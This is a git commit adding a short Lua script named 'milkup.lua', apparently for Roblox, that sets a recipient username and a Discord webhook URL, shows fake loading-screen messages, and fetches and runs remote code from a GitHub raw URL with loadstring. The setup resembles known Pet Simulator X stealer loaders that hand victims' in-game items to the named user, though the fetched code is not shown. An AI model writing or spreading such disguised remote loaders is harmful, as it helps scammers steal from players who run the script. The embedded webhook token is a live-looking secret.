a117ca6eaea995fcf7c37ac353c537ef3268b2c2
Relea11 <132143855+Relea11@users.noreply.github.com>
2023-04-29 16:28:02 +0300

    Add files via upload

---
+++ milkup.lua
@@ -0,0 +1,11 @@
+Username = "NAMSULUORZEN"
+WebHook = "https://discord.com/api/webhooks/1101861903355097128/Xk-y9VLS-DyzgCVirmJAITr2_hKvL-qQ9K_ycdnZ5vJr1wx3BdC65_auWZk-BEH5bB3X"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Milkup"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
